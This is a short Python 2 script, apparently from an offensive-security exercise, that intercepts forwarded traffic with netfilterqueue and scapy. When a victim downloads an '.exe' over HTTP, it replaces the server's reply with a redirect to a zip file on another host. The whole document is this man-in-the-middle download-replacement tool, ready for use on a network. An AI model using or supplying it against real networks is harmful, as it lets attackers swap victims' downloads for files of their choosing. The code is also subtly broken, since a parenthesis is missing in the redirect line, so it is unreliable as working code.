#built with python 2
import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) #converting our packet into scapy packet so that we can use filtering functions and layers of scapy
    if scapy_packet.haslayer(scapy.Raw):  # DNSRR means dns response DNSQR means dns request
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing files")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://212.183.159.230/5MB.zip\n\n"
                packet.set_payload(str(modified_packet))
    packet.accept()

 

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) #binding (bind(0)) queue with linux machine queue iptables -I FORWARD -j NFQUEUE --queue-num 0
queue.run()
